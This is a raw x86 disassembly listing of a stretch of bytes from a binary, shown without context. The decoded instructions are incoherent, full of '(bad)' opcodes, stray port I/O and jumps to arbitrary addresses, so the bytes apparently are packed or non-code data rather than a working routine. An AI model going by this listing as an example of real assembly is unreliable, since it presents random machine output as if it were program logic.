  40802f:	jne    0x407feb
  408031:	daa    
  408032:	sub    cl,0xc1
  408035:	dec    edx
  408036:	sahf   
  408037:	xchg   edi,eax
  408038:	mov    ebp,0xad351ffa
  40803d:	stos   DWORD PTR es:[edi],eax
  40803e:	add    ebp,DWORD PTR [edx+0x7cb49e27]
  408044:	xor    edx,esp
  408046:	leave  
  408047:	jl     0x40801c
  408049:	cwde   
  40804a:	xor    al,0x57
  40804c:	gs mov edx,0x8997903d
  408052:	pop    ss
  408053:	xchg   edx,esi
  408055:	sbb    ebp,DWORD PTR [eax+eax*8-0x6d]
  408059:	sbb    DWORD PTR [edi+0x18],0x8682e42a
  408060:	int3   
  408061:	mov    WORD PTR [ecx-0x38],gs
  408064:	outs   dx,DWORD PTR ds:[esi]
  408065:	shl    ecx,cl
  408067:	arpl   WORD PTR [ecx],bp
  408069:	shr    DWORD PTR cs:[ebp-0x69],0x8
  40806e:	cmp    al,0x63
  408070:	(bad)  
  408071:	pop    esp
  408072:	idiv   bh
  408074:	in     al,dx
  408075:	add    BYTE PTR [edx-0x2aaa36fb],bl
  40807b:	sbb    edi,edx
  40807d:	outs   dx,DWORD PTR ds:[esi]
  40807e:	rcr    DWORD PTR [ecx-0x189f76cb],0x4f
  408085:	xlat   BYTE PTR ds:[ebx]
  408086:	jge    0x40800d
  408088:	ss cmp edx,esp
  40808b:	ss sub dl,dh
  40808e:	add    DWORD PTR [ebx+0x3],ebp
  408091:	pop    esp
  408092:	int    0xbc
  408094:	xor    ebp,esi
  408096:	lods   al,BYTE PTR ds:[esi]
  408097:	push   0x910fb6da
  40809c:	mov    ebp,0xb4bbee8a
  4080a1:	dec    esp
  4080a2:	inc    ecx
  4080a3:	jno    0x4080f7
  4080a5:	and    esp,eax
  4080a7:	hlt    
  4080a8:	cli    
  4080a9:	cmp    cl,BYTE PTR [ebx]
  4080ab:	mov    ch,0x44
  4080ad:	sti    
  4080ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080b0:	daa    
  4080b1:	repnz inc esi
  4080b3:	xor    DWORD PTR [ebx-0x65e35caa],edi
  4080b9:	mov    WORD PTR [ecx+0x2346a398],es
  4080bf:	sbb    DWORD PTR [edx-0x3a78a034],esi
  4080c5:	inc    ebp
  4080c6:	xor    ah,0xe5
  4080c9:	xor    eax,0x1ff7f84e
  4080ce:	in     al,0xaf
  4080d0:	push   ds
  4080d1:	(bad)  
  4080d2:	pop    esp
  4080d3:	cmp    DWORD PTR [esi],edx
  4080d5:	push   edi
  4080d6:	test   BYTE PTR [edx],dh
  4080d8:	pop    ebp
  4080d9:	fisub  WORD PTR [ecx]
  4080db:	jmp    0x77b3a33f
  4080e0:	mov    esp,0x2f15f8ba
  4080e5:	xor    al,BYTE PTR [ecx]
  4080e7:	stos   DWORD PTR es:[edi],eax
  4080e8:	jne    0x408099
  4080ea:	fild   DWORD PTR [ecx]
  4080ec:	dec    ecx
  4080ed:	js     0x40808a
  4080ef:	and    al,0xed
  4080f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080f2:	adc    ch,bh
  4080f4:	fbstp  TBYTE PTR [edx-0x7d]
  4080f7:	js     0x408132
  4080f9:	jnp    0x4080bd
  4080fb:	in     al,dx
  4080fc:	sbb    eax,0x1c60761f
  408101:	in     al,dx
  408102:	mov    esi,0x41566b75
  408107:	jmp    0x4236:0x9176819e
  40810e:	(bad)  
  40810f:	hlt    
  408110:	jmp    0xb704b41e
  408115:	add    eax,ebx
  408117:	xchg   DWORD PTR ds:0xff167c01,ebp
  40811d:	fstp   DWORD PTR [ebx]
  40811f:	clc    
  408120:	push   ecx
  408121:	stos   DWORD PTR es:[edi],eax
  408122:	mov    ?,WORD PTR [ebx]
  408124:	sbb    ebp,DWORD PTR [eax-0x69]
  408127:	dec    ecx
  408128:	sbb    DWORD PTR [edi],0xffffff80
  40812b:	stos   WORD PTR es:[edi],ax
  40812d:	std    
  40812e:	xchg   ebp,eax
  40812f:	mov    ebx,0x17f9eb77
  408134:	mov    WORD PTR ss:[ebx+edi*4],ds
  408138:	pop    edx
  408139:	mov    ebx,0x3f2f10c
  40813e:	lock stos BYTE PTR es:[edi],al
  408140:	rcl    ch,0x5
  408143:	(bad)  
  408144:	pusha  
  408145:	fld    st(6)
  408147:	mov    ch,0x51
  408149:	rcl    DWORD PTR [edx],1
  40814b:	addr16 xchg ebx,eax
  40814d:	mov    ebp,0xc7b691f9
  408152:	mov    al,ds:0x31ee6857
  408157:	retf   0x7bf8
  40815a:	jge    0x40814b
  40815c:	fcomp  QWORD PTR [eax+0x65]
  40815f:	jl     0x408174
  408161:	cs jbe 0x4081c6
  408164:	icebp  
  408165:	push   0xa303c572
  40816a:	(bad)  
  40816b:	mov    ds:0xd98b950c,al
  408170:	jne    0x4080f5
  408172:	xor    eax,0x123a5bb1
  408177:	pop    edi
  408178:	pop    esi
  408179:	rcr    DWORD PTR [edi-0x55ecbcae],0x6
  408180:	jo     0x408197
  408182:	pusha  
  408183:	push   ebx
  408184:	sub    esi,ebp
  408186:	and    BYTE PTR [esi-0x64],0x2a
  40818a:	push   es
  40818b:	pusha  
  40818c:	sbb    DWORD PTR [ebx],0xc537b59e
  408192:	into   
  408193:	cmp    eax,0x8fecad0d
  408198:	jnp    0x4081c8
  40819a:	xchg   ebp,eax
  40819b:	mov    ebx,0x3fc7d490
  4081a0:	in     al,0xaa
  4081a2:	jno    0x40819f
  4081a4:	cld    
  4081a5:	fldenv [edi]
  4081a7:	push   0xd8fb6003
  4081ac:	hlt    
  4081ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081ae:	mov    ds:0x58cc25f1,al
  4081b3:	dec    edi
  4081b4:	jp     0x408190
  4081b6:	rol    BYTE PTR [ecx],0xb1
  4081b9:	fwait
  4081ba:	dec    edi
  4081bb:	push   edi
  4081bc:	cmp    BYTE PTR [ecx],al
  4081be:	aad    0x80
  4081c0:	sub    eax,0x59241349
  4081c5:	outs   dx,BYTE PTR ds:[esi]
  4081c6:	stos   DWORD PTR es:[edi],eax
  4081c7:	shl    DWORD PTR [edx-0x7bd22258],0x20
  4081ce:	ja     0x40821d
  4081d0:	out    0x15,al
  4081d2:	lods   eax,DWORD PTR ds:[esi]
  4081d3:	and    al,0x5
  4081d5:	fcomp  QWORD PTR [eax+0x4a]
  4081d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081d9:	fs dec ebx
  4081db:	daa    
  4081dc:	mov    ss,ebp
  4081de:	xchg   esi,eax
  4081df:	dec    ebx
  4081e0:	push   ebp
  4081e1:	jbe    0x408234
  4081e3:	add    BYTE PTR [esi],0x99
  4081e6:	sub    BYTE PTR [edi],dh
  4081e8:	sti    
  4081e9:	arpl   WORD PTR [ecx+0x789ea2a8],bp
  4081ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081f0:	and    al,0xb3
  4081f2:	(bad)  
  4081f3:	(bad)  
  4081f5:	adc    eax,0x5a3e07f8
  4081fa:	std    
  4081fb:	shl    DWORD PTR [ebx+0x3f8b1a6a],cl
  408201:	mov    eax,0xd15eb7a0
  408206:	(bad)  
  408209:	scas   eax,DWORD PTR es:[edi]
  40820a:	cmp    BYTE PTR [ebx-0x563ca0e],bl
  408210:	dec    ecx
  408211:	sub    al,0x16
  408213:	jge    0x40819d
  408215:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  408217:	push   0xd
  408219:	sbb    al,al
  40821b:	dec    edx
  40821c:	xchg   ebx,eax
  40821d:	jno    0x408223
  40821f:	loope  0x408205
  408221:	jne    0x40825c
  408223:	xlat   BYTE PTR ds:[ebx]
  408224:	clc    
  408225:	pop    esp
  408226:	popf   
  408227:	ds loopne 0x408291
  40822a:	pop    ss
  40822b:	(bad)  
  40822c:	xchg   edi,eax
  40822d:	test   BYTE PTR ds:0x73e3e1a9,0x5a
  408234:	jmp    DWORD PTR [ebx-0x7c31b15a]
  40823a:	and    al,0x55
  40823c:	push   ecx
  40823d:	ror    DWORD PTR [edx+0x7408f29],cl
  408243:	jge    0x4081f2
  408245:	lods   al,BYTE PTR ds:[esi]
  408246:	jmp    0x4081e3
  408248:	call   0xc479d18a
  40824d:	lods   al,BYTE PTR ds:[esi]
  40824e:	mov    edx,0xfdbe0b1f
  408253:	out    0x29,eax
  408255:	mov    edi,0xabfc2c6a
  40825a:	and    DWORD PTR [edx+0x5e],0x2ceacb93
  408261:	dec    ebx
  408262:	jl     0x40822f
  408264:	imul   ebp,ecx,0x71633d3e
  40826a:	lds    eax,FWORD PTR [ebx]
  40826c:	xchg   edx,eax
  40826d:	cs dec ebx
  40826f:	jmp    0x860f:0xc5e60ab5
  408276:	mov    bl,0xb6
  408278:	(bad)  
  408279:	mov    dl,0x7
  40827b:	adc    edx,DWORD PTR [ebx]
  40827d:	shl    DWORD PTR [eax+esi*1-0x43],1
  408281:	mov    al,0xd2
  408283:	(bad)  
  408284:	xchg   esp,eax
  408285:	pop    ecx
  408286:	adc    eax,edx
  408288:	fwait
  408289:	outs   dx,DWORD PTR ds:[esi]
  40828a:	push   esi
  40828b:	mov    esi,0x597369a0
  408290:	xchg   BYTE PTR [eax-0x4],bh
  408293:	mov    cl,dl
  408295:	mov    ah,0xda
  408297:	xchg   esp,eax
  408298:	xor    dh,BYTE PTR [ecx+edi*4]
  40829b:	outs   dx,DWORD PTR ds:[esi]
  40829c:	imul   esp,DWORD PTR [edi+0x13],0x94e60018
  4082a3:	add    al,0x9
  4082a5:	push   ebx
  4082a6:	ror    BYTE PTR [ecx+0x190ad23a],1
  4082ac:	adc    eax,0x65d28949
  4082b1:	pop    es
  4082b2:	jge    0x408235
  4082b4:	out    dx,al
  4082b5:	adc    BYTE PTR [ebx+0x3e7461eb],ah
  4082bb:	shl    BYTE PTR [esi-0x28f47c0d],cl
  4082c1:	test   al,0x9c
  4082c3:	fidivr DWORD PTR [esi+0x58b2440a]
  4082c9:	stos   BYTE PTR es:[edi],al
  4082ca:	lods   eax,DWORD PTR ds:[esi]
  4082cb:	loope  0x4082d7
  4082cd:	and    ebp,DWORD PTR [ecx-0x402c7fbf]
  4082d3:	pop    esi
  4082d4:	(bad)  
  4082d5:	pop    es
  4082d6:	ret    0xa0c4
  4082d9:	pop    eax
  4082da:	in     eax,dx
  4082db:	xchg   esp,eax
  4082dc:	int    0x83
  4082de:	loope  0x4082a4
  4082e0:	mov    ch,0x67
  4082e2:	pushf  
  4082e3:	cmp    ah,BYTE PTR fs:[edx+esi*1]
  4082e7:	mov    al,0x2a
  4082e9:	loope  0x4082db
  4082eb:	sub    eax,0x1a0f0426
  4082f0:	jnp    0x4082a5
  4082f2:	sahf   
  4082f3:	adc    eax,0x627deb79
  4082f8:	dec    ecx
  4082f9:	sar    DWORD PTR [esi+edx*1],1
  4082fc:	mov    eax,0xa87a60c1
  408301:	jmp    0xc1a724af
  408306:	push   edx
  408307:	mov    al,0x1
  408309:	das    
  40830a:	push   edi
  40830b:	lods   al,BYTE PTR ds:[esi]
  40830c:	leave  
  40830d:	aam    0xf9
  40830f:	les    edi,FWORD PTR [ebx-0xa]
  408312:	into   
  408313:	fwait
  408314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408315:	mov    ebx,0xe1a6b7
  40831a:	add    edx,DWORD PTR [esi]
  40831c:	push   eax
  40831d:	pushf  
  40831e:	lea    edi,[ecx]
  408320:	repnz test al,0xad
  408323:	adc    ebp,DWORD PTR [ebp-0x71cdf04a]
  408329:	inc    edi
  40832a:	fiadd  DWORD PTR [esi+ebp*4-0x26]
  40832e:	pop    es
  40832f:	mov    al,ds:0xaaa56ee0
  408334:	fistp  WORD PTR [ebx-0x35]
  408337:	or     DWORD PTR [edi],edx
  408339:	sub    al,0xdc
  40833b:	fild   DWORD PTR ds:0xcce20d9
  408341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408342:	push   es
  408343:	jne    0x408378
  408345:	push   ecx
  408346:	pop    eax
  408347:	xchg   BYTE PTR [edx],bl
  408349:	pop    ebp
  40834a:	test   eax,0x45e36936
  40834f:	mov    bl,0xde
  408351:	and    eax,0x94025c43
  408356:	xchg   BYTE PTR [ecx-0x76b07ce7],ah
  40835c:	or     al,0x83
  40835e:	outs   dx,BYTE PTR ds:[esi]
  40835f:	nop
  408360:	stos   BYTE PTR es:[edi],al
  408361:	add    al,BYTE PTR [esi+edi*8+0x479cdee1]
  408368:	rcl    DWORD PTR [ecx-0x39],1
  40836b:	mov    bh,0xbf
  40836d:	jno    0x40837a
  40836f:	sub    BYTE PTR [ecx+0x48a3eabf],al
  408375:	adc    DWORD PTR [esi],esp
  408377:	out    0xcc,eax
  408379:	outs   dx,DWORD PTR ds:[esi]
  40837a:	hlt    
  40837b:	addr16 retf 
  40837d:	mov    al,ds:0x54881823
  408382:	mov    bl,0x31
  408384:	add    ch,BYTE PTR [eax+edx*4+0x2b01a4ea]
  40838b:	fcomp  st(3)
  40838d:	cmc    
  40838e:	div    DWORD PTR [edi-0x4cb56f2]
  408394:	mov    bl,ah
  408396:	and    al,0x49
  408398:	sub    BYTE PTR [ebx],al
  40839a:	hlt    
  40839b:	xor    DWORD PTR [eax-0x25],edi
  40839e:	rcr    di,cl
  4083a1:	or     DWORD PTR [bx-0x39],0x6af65b54
  4083a9:	xor    al,0xd7
  4083ab:	adc    cl,ah
  4083ad:	and    DWORD PTR [ebx],edi
  4083af:	popa   
  4083b0:	sbb    al,BYTE PTR [edi]
  4083b2:	mov    al,ds:0x7ea406f3
  4083b7:	pop    edi
  4083b8:	mov    ebp,0x6a5907b1
  4083bd:	stc    
  4083be:	mov    esp,0x33d85af8
  4083c3:	push   es
  4083c4:	aam    0xc6
  4083c6:	pop    es
  4083c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083c8:	test   eax,edx
  4083ca:	sti    
  4083cb:	or     BYTE PTR [esp+ecx*1],bh
  4083ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083cf:	sbb    cl,BYTE PTR [esi]
  4083d1:	daa    
  4083d2:	data16 mov bl,0x1d
  4083d5:	popf   
  4083d6:	push   ds
  4083d7:	sub    al,0x53
  4083d9:	imul   DWORD PTR [esp+edi*8+0x29dcceef]
  4083e0:	(bad)  
  4083e1:	cmp    esi,edx
  4083e3:	push   esi
  4083e4:	mov    ebp,eax
  4083e6:	jae    0x4083c4
  4083e8:	shr    BYTE PTR [ecx-0x3e625686],0x1a
  4083ef:	imul   edx,DWORD PTR [edi+0x22],0x2efa6216
  4083f6:	ret    0xe639
  4083f9:	ins    DWORD PTR es:[edi],dx
  4083fa:	icebp  
  4083fb:	lods   eax,DWORD PTR ds:[esi]
  4083fc:	cmp    BYTE PTR [ebp+0x48657265],cl
  408402:	sub    DWORD PTR [ebx-0x2c9fe63c],eax
  408408:	mov    ds:0xcfc78312,al
  40840d:	pop    esp
  40840e:	imul   ecx,DWORD PTR [edi],0x238ea1d7
  408414:	and    cl,BYTE PTR [eax-0x39]
  408417:	pop    eax
  408418:	push   esi
  408419:	rol    BYTE PTR [eax],cl
  40841b:	retf   
  40841c:	test   cl,al
  40841e:	cmp    DWORD PTR [ebp+0x2567dde8],edx
  408424:	and    al,0xab
  408426:	test   al,0x21
  408428:	arpl   WORD PTR [ecx],cx
  40842a:	push   ebx
  40842b:	dec    esi
  40842c:	and    esi,DWORD PTR [esi]
  40842e:	gs pop ds
  408430:	sbb    BYTE PTR [ebx],dl
  408432:	mov    dh,0xc0
  408434:	fstp   DWORD PTR [ebx-0x138fab17]
  40843a:	daa    
  40843b:	aam    0x0
  40843d:	add    al,0x5e
  40843f:	sub    BYTE PTR [edx],dh
  408441:	push   0x6d
  408443:	jnp    0x4083f6
  408445:	dec    esi
  408446:	sahf   
  408447:	xor    DWORD PTR [ebx+0x510e17fe],ebp
  40844d:	sahf   
  40844e:	sbb    BYTE PTR [eax+0x1a],ah
  408451:	xchg   esp,eax
  408452:	xchg   BYTE PTR [edi+edx*8-0x61d751f0],al
  408459:	out    dx,al
  40845a:	mov    WORD PTR [ebx+edx*8],?
  40845d:	xchg   esp,eax
  40845e:	hlt    
  40845f:	inc    esi
  408460:	jnp    0x4084c3
  408462:	or     cl,BYTE PTR [edx+eiz*2-0x7d]
  408466:	add    DWORD PTR [esi],0xffffffe2
  408469:	inc    esi
  40846a:	call   0x76844ca9
  40846f:	and    esi,edx
  408471:	add    eax,0xa1d482df
  408476:	ret    
  408477:	pushf  
  408478:	ret    0xea62
  40847b:	xor    al,BYTE PTR [ecx-0x32d57e20]
  408481:	ror    cl,1
  408483:	loopne 0x40842b
  408485:	stos   BYTE PTR es:[edi],al
  408486:	lea    edx,[ecx+0x33]
  408489:	(bad)  
  40848a:	cmp    al,0x14
  40848c:	ret    
  40848d:	ret    0xd9a4
  408490:	jmp    0x369d2232
  408495:	lahf   
  408496:	int3   
  408497:	lods   eax,DWORD PTR ds:[esi]
  408498:	mov    bl,0x33
  40849a:	test   BYTE PTR fs:[esi+0x4f],0x64
  40849f:	call   0xaeb50cd3
  4084a4:	push   ecx
  4084a5:	sbb    DWORD PTR [ebp+0x2a],ebx
  4084a8:	adc    DWORD PTR [edx+eiz*8-0x2f],esp
  4084ac:	nop
  4084ad:	aam    0x9
  4084af:	sbb    ebp,DWORD PTR [ebx+ecx*2]
  4084b2:	jns    0x4084da
  4084b4:	cmp    ebx,edx
  4084b6:	fs mov bl,0xb9
  4084b9:	add    eax,0x2cc4b6e5
  4084be:	xchg   ebp,eax
  4084bf:	popf   
  4084c0:	(bad)  
  4084c1:	push   ds
  4084c2:	fiadd  DWORD PTR [ebx+esi*2-0x22]
  4084c6:	popa   
  4084c7:	inc    esi
  4084c8:	(bad)  
  4084c9:	mov    cl,0xf3
  4084cb:	arpl   WORD PTR [edx],sp
  4084cd:	pop    ebp
  4084ce:	mov    ecx,DWORD PTR [esi]
  4084d0:	es loope 0x4084ee
  4084d3:	inc    ebx
  4084d4:	push   ecx
  4084d5:	jecxz  0x408463
  4084d7:	push   edx
  4084d8:	aad    0x3a
  4084da:	push   ds
  4084db:	jmp    0x408528
  4084dd:	xlat   BYTE PTR ds:[ebx]
  4084de:	mov    edx,DWORD PTR [ebp-0x1965c5b5]
  4084e4:	cwde   
  4084e5:	xchg   DWORD PTR [eax+0x1b],esi
  4084e8:	cmp    al,0x19
  4084ea:	repnz test eax,0xff1d50e4
  4084f0:	fwait
  4084f1:	lods   al,BYTE PTR ds:[esi]
  4084f2:	repz inc eax
  4084f4:	mov    ebp,0xe07d0cf0
  4084f9:	loop   0x4084df
  4084fb:	adc    ch,BYTE PTR [edx+esi*1+0x471d199d]
  408502:	int3   
  408503:	ins    DWORD PTR es:[edi],dx
  408504:	jp     0x408536
  408506:	pop    ebp
  408507:	inc    eax
  408508:	xchg   edx,eax
  408509:	xor    esp,DWORD PTR [edi]
  40850b:	(bad)  
  40850c:	sti    
  40850d:	xlat   BYTE PTR ds:[ebx]
  40850e:	jno    0x408502
  408510:	xchg   edx,eax
  408511:	mov    DWORD PTR [ebx],0x6b06a103
  408517:	mov    ds:0xd54fe945,al
  40851c:	shl    BYTE PTR [edx],cl
  40851e:	(bad)  
  40851f:	stos   DWORD PTR es:[edi],eax
  408520:	mov    ah,0x20
  408522:	adc    ecx,edi
  408524:	shl    BYTE PTR [esi-0x3f],1
  408527:	lahf   
  408528:	dec    esi
  408529:	ja     0x40855a
  40852b:	lods   al,BYTE PTR ds:[esi]
  40852c:	clc    
  40852d:	sbb    esi,DWORD PTR [edx-0x71]
  408530:	jle    0x40853c
  408532:	ins    BYTE PTR es:[edi],dx
  408533:	pop    ebp
  408534:	test   al,0x36
  408536:	mov    eax,ds:0xb77f16cd
  40853b:	mov    al,0xf
  40853d:	xor    al,0x22
  40853f:	je     0x40854d
  408541:	sbb    cl,ah
  408543:	cwde   
  408544:	rcl    BYTE PTR [ebx-0x6],0x63
  408548:	jle    0x408526
  40854a:	jmp    0xa990:0x2dca8616
  408551:	cmp    al,BYTE PTR ds:0xdc092fb
  408557:	imul   esi,DWORD PTR [esi+0x6285befb],0x5d
  40855e:	(bad)  
  40855f:	cli    
  408560:	dec    esi
  408561:	push   edx
  408562:	dec    eax
  408563:	sahf   
  408564:	shr    DWORD PTR [edx+0x1569f081],1
  40856a:	stos   DWORD PTR es:[edi],eax
  40856b:	in     eax,dx
  40856c:	(bad)  
  40856d:	imul   ebx,DWORD PTR ds:0xfc482742,0xeb4bff0d
  408577:	pop    esp
  408578:	adc    BYTE PTR [esi+0x38],dh
  40857b:	loope  0x4085a4
  40857d:	lods   eax,DWORD PTR ds:[esi]
  40857e:	xor    DWORD PTR [esi+0x193e0047],0x3be9ba45
  408588:	stc    
  408589:	cmp    dl,al
  40858b:	xchg   DWORD PTR [ebx+0x4a],ecx
  40858e:	js     0x408530
  408590:	leave  
  408591:	retf   
  408592:	stos   BYTE PTR es:[edi],al
  408593:	mov    bl,BYTE PTR [edi-0x4bb0749c]
  408599:	scas   eax,DWORD PTR es:[edi]
  40859a:	mov    WORD PTR [esp+ecx*1+0x30e3cd11],?
  4085a1:	aas    
  4085a2:	in     al,dx
  4085a3:	hlt    
  4085a4:	mov    ecx,0x80147479
  4085a9:	scas   eax,DWORD PTR es:[edi]
  4085aa:	fwait
  4085ab:	pop    edi
  4085ac:	dec    esp
  4085ad:	dec    edx
  4085ae:	mov    cl,0xec
  4085b0:	mov    ebx,0x141346c7
  4085b5:	addr16 mov edx,0xe684dc42
  4085bb:	sbb    eax,0xee8200d7
  4085c0:	mov    bl,0x5
  4085c2:	test   al,0xfb
  4085c4:	stos   DWORD PTR es:[edi],eax
  4085c5:	fmul   DWORD PTR [ecx-0x6b2f95b3]
  4085cb:	lahf   
  4085cc:	sbb    DWORD PTR [edx+ebx*2+0x77],eax
  4085d0:	adc    al,0x7d
  4085d2:	inc    ecx
  4085d3:	repnz pop eax
  4085d5:	int    0xec
  4085d7:	mov    bh,0xdd
  4085d9:	jle    0x4085a1
  4085db:	sub    ebx,esp
  4085dd:	call   0xe7b7:0x5e2c2202
  4085e4:	mov    ch,0xc0
  4085e6:	daa    
  4085e7:	pop    esi
  4085e8:	mov    DWORD PTR ds:0x497f,ecx
  4085ed:	sti    
  4085ee:	and    esi,DWORD PTR [ebx]
  4085f0:	div    BYTE PTR [eax-0x7b]
  4085f3:	mov    esp,0x2c50bdfe
  4085f8:	loop   0x4085f6
  4085fa:	xor    BYTE PTR [edi+0x6c],cl
  4085fd:	icebp  
  4085fe:	mov    ds:0x51361da1,al
  408603:	call   0x8fc68733
  408608:	sub    esi,DWORD PTR [esi]
  40860a:	pusha  
  40860b:	sbb    al,0xd2
  40860d:	ror    bl,1
  40860f:	cmp    edi,DWORD PTR [ebp+0x14]
  408612:	dec    ebp
  408613:	and    al,0x98
  408615:	xor    dh,0x18
  408618:	push   esp
  408619:	out    dx,eax
  40861a:	imul   BYTE PTR [eax+0x6a]
  40861d:	scas   eax,DWORD PTR es:[edi]
  40861e:	shl    DWORD PTR [ecx],0xab
  408621:	add    cl,ah
  408623:	aad    0x4c
  408625:	push   edx
  408626:	sbb    al,0x9a
  408628:	jmp    0xa2dd3401
  40862d:	(bad)  
  40862e:	(bad)  
  40862f:	inc    ebx
  408630:	mov    WORD PTR [edi-0x679803bc],fs
  408636:	jne    0x40864e
  408638:	stos   BYTE PTR es:[edi],al
  408639:	je     0x4086a6
  40863b:	dec    esp
  40863c:	int3   
  40863d:	adc    ecx,ebx
  40863f:	fisttp WORD PTR [ebp+0x316be9da]
  408645:	inc    eax
  408646:	imul   edx,esp,0x12
  408649:	arpl   WORD PTR [edi+0x55a5dc45],bp
  40864f:	stos   DWORD PTR es:[edi],eax
  408650:	and    DWORD PTR [edx+0xfb5bc3e],esp
  408656:	push   es
  408657:	dec    eax
  408658:	push   0x38b0f602
  40865d:	xchg   bl,bh
  40865f:	inc    esi
  408660:	jne    0x40864e
  408662:	mov    bh,0x14
  408664:	rol    DWORD PTR [edi-0x380c596f],cl
  40866a:	ja     0x4086be
  40866c:	mov    DWORD PTR [edi-0x6e],esp
  40866f:	mov    al,0xf9
  408671:	add    dl,BYTE PTR [ebx+0xb]
  408674:	and    al,0x66
  408676:	mov    ds:0xb77759a7,al
  40867b:	loop   0x4086ea
  40867d:	push   ds
  40867e:	ins    BYTE PTR es:[edi],dx
  40867f:	sub    DWORD PTR [ebx-0x39365cf1],0xcd4a4168
  408689:	dec    edx
  40868a:	aam    0xc8
  40868c:	aaa    
  40868d:	adc    bh,BYTE PTR [edi]
  40868f:	lods   al,BYTE PTR ds:[esi]
  408690:	add    BYTE PTR [edx+ebp*1],0xff
  408694:	inc    eax
  408695:	mov    ecx,0x8c2a7a4e
  40869a:	dec    edi
  40869b:	mov    bl,0x36
  40869d:	pop    esp
  40869e:	xchg   ebp,eax
  40869f:	add    DWORD PTR ds:0x783d5230,esi
  4086a5:	repnz dec edi
  4086a8:	call   0x615e62dc
  4086ad:	jmp    0x25ec:0xd8b7d4cb
  4086b4:	iret   
  4086b5:	je     0x4086ef
  4086b7:	test   DWORD PTR [edi],0xc0edcbcc
  4086bd:	psrad  mm5,QWORD PTR cs:[eax]
  4086c1:	jmp    0xe5ea01d5
  4086c6:	jecxz  0x4086e7
  4086c8:	add    BYTE PTR [esi+ecx*8-0x7f],cl
  4086cc:	cdq    
  4086cd:	dec    esp
  4086ce:	enter  0x7996,0x7c
  4086d2:	mov    edi,0x9e496d5
  4086d7:	(bad)  
  4086d8:	cmp    dl,bl
  4086da:	push   es
  4086db:	jmp    0xc816d392
  4086e0:	sbb    ebx,DWORD PTR [esi+esi*8-0x61]
  4086e4:	push   cs
  4086e5:	ret    
  4086e6:	push   eax
  4086e7:	cmc    
  4086e8:	dec    ecx
  4086e9:	dec    edx
  4086ea:	add    BYTE PTR [esi+0x3f],dh
  4086ed:	jae    0x408725
  4086ef:	push   ds
  4086f0:	xlat   BYTE PTR ds:[ebx]
  4086f1:	scas   al,BYTE PTR es:[edi]
  4086f2:	sbb    dh,0x79
  4086f5:	mov    dl,0xb
  4086f7:	stc    
  4086f8:	jecxz  0x408741
  4086fa:	int    0xfd
  4086fc:	push   0xffffffae
  4086fe:	ret    
  4086ff:	sahf   
  408700:	(bad)  
  408701:	enter  0x45e9,0x8c
  408705:	(bad)  
  408706:	push   0xffffffc5
  408708:	sub    edx,DWORD PTR [eax]
  40870a:	jbe    0x4086b7
  40870c:	dec    ebx
  40870d:	mov    ds:0x3bf7dc71,eax
  408712:	sbb    esp,edi
  408714:	enter  0xe80,0x17
  408718:	loope  0x4086e4
  40871a:	loope  0x40873d
  40871c:	xchg   ebp,eax
  40871d:	jmp    0x111a6a6f
  408722:	ja     0x4086b3
  408724:	jo     0x40872c
  408726:	push   edx
  408727:	sbb    DWORD PTR [ecx-0x57b34934],ebp
  40872d:	pop    edx
  40872e:	mov    DWORD PTR [edi-0x1e],ebx
  408731:	lahf   
  408732:	xor    al,0x5f
  408734:	inc    ebp
  408735:	jnp    0x408747
  408737:	cld    
  408738:	js     0x4086d7
  40873a:	fisub  WORD PTR ds:0x40134b44
  408740:	(bad)  
  408741:	dec    ebx
  408742:	xor    BYTE PTR [esi],dh
  408744:	sub    eax,0x53b339a8
  408749:	retf   0xe6a1
  40874c:	daa    
  40874d:	sbb    BYTE PTR [ecx+0x7b],ah
  408750:	adc    al,0x91
  408752:	sub    ebx,DWORD PTR [edx-0x28]
  408755:	adc    bl,0x91
  408758:	mov    ebp,0xef2ad642
  40875d:	jge    0x408721
  40875f:	mov    edx,eax
  408761:	aam    0xd7
  408763:	inc    esp
  408764:	ss pusha 
  408766:	stos   BYTE PTR es:[edi],al
  408767:	cmp    DWORD PTR [edx],ebp
  408769:	push   edi
  40876a:	retf   0xa62b
  40876d:	lahf   
  40876e:	test   al,0x3c
  408770:	out    dx,al
  408771:	push   ebp
  408772:	mov    dh,0xcd
  408774:	rol    BYTE PTR [eax],0x4c
  408777:	sbb    dl,ah
  408779:	ss adc eax,0x367191aa
  40877f:	dec    edi
  408780:	mov    ds:0xb1db907,al
  408785:	shl    BYTE PTR [eax+0x17],1
  408788:	cmovs  esi,DWORD PTR [edx-0x2d31f95]
  40878f:	mov    ecx,0x6330f232
  408794:	cmp    al,0x20
  408796:	rcr    dh,cl
  408798:	dec    edx
  408799:	das    
  40879a:	pop    ebx
  40879b:	xchg   DWORD PTR [ebx-0x28],ebx
  40879e:	dec    ebx
  40879f:	fnstsw WORD PTR [eax]
  4087a1:	aam    0x40
  4087a3:	mov    dh,0xf7
  4087a5:	push   ecx
  4087a6:	daa    
  4087a7:	test   BYTE PTR [ebx-0x67],0x47
  4087ab:	jb     0x408740
  4087ad:	xchg   edi,eax
  4087ae:	fwait
  4087af:	(bad)  
  4087b1:	mov    bh,0xec
  4087b3:	ds ja  0x40874f
  4087b6:	jo     0x40875d
  4087b8:	das    
  4087b9:	jmp    0x1b52e428
  4087be:	das    
  4087bf:	loop   0x408797
  4087c1:	jmp    DWORD PTR [esp+ecx*2]
  4087c4:	adc    DWORD PTR [ecx],esi
  4087c6:	jno    0x408828
  4087c8:	cmp    bh,ah
  4087ca:	xchg   edx,eax
  4087cb:	repz dec ebp
  4087cd:	fldcw  WORD PTR [esp+edi*1-0x51]
  4087d1:	clc    
  4087d2:	std    
  4087d3:	out    0x29,al
  4087d5:	jmp    0x1106:0x30d7075a
  4087dc:	sub    al,BYTE PTR [ecx+esi*1+0xef91f6b]
  4087e3:	xchg   BYTE PTR ds:0xde878756,cl
  4087e9:	adc    dl,BYTE PTR [edx-0x26f70e22]
  4087ef:	adc    al,0xdb
